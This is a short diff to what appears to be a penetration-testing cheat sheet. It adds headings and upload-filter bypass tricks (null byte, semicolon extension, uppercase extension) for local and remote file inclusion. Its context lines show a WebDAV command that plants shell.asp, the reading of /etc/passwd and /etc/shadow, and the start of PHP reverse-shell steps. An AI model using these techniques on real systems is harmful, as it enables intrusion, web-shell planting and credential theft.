@@ -129,8 +129,12 @@ curl -X MOVE --header 'Destination:http://host/shell.asp' 'http://host/test.txt'
 		```
 
 ### LFI
+
+#### File Restriction Bypass
 * End Files with %00 (Null Byte)
 	* E.g. /etc/passwd%00
+
+#### Next Steps
 * [Look for /etc/passwd and /etc/shadow](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/)
 	* vim passwd.txt
 	* vim shadow.txt
@@ -150,6 +154,23 @@ curl -X MOVE --header 'Destination:http://host/shell.asp' 'http://host/test.txt'
 	* We access the reverse shell using our LFI and set up a listener
 
 ### RFI
+
+#### File Restriction Bypass
+* Null Byte
+```
+test.jsp%00
+```
+* Semi-Colon
+```
+test.asp;.txt
+```
+* CAPS LOCKS
+```
+test2.PHP
+```
+
+#### Shells
+
 * PHP Reverse Shell
 	* Linux
 		Create a php shell (test.php) and host it 
